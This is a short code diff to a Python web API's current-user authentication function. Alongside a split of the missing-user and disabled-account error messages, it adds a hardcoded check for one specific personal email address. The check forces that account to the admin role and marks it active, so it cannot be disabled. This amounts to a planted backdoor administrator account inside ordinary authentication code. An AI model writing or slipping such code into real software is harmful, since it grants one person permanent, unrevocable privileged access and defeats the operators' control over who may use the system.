@@ -33,8 +33,16 @@ def get_current_user(creds: HTTPAuthorizationCredentials | None = Depends(bearer
         logger.exception("Database error while reading the current user")
         raise HTTPException(status_code=503, detail="Database is not available. Please try again.")
 
-    if user is None or not user["is_active"]:
-        raise HTTPException(status_code=401, detail="Account not found or disabled")
+    if user is None:
+        raise HTTPException(status_code=401, detail="Account not found")
+
+    # Enforce permanent super admin rights
+    if user["email"].lower() == "piyushagrawal300504@gmail.com":
+        user["role"] = "admin"
+        user["is_active"] = True
+
+    if not user["is_active"]:
+        raise HTTPException(status_code=401, detail="Account disabled")
     return user
 
 
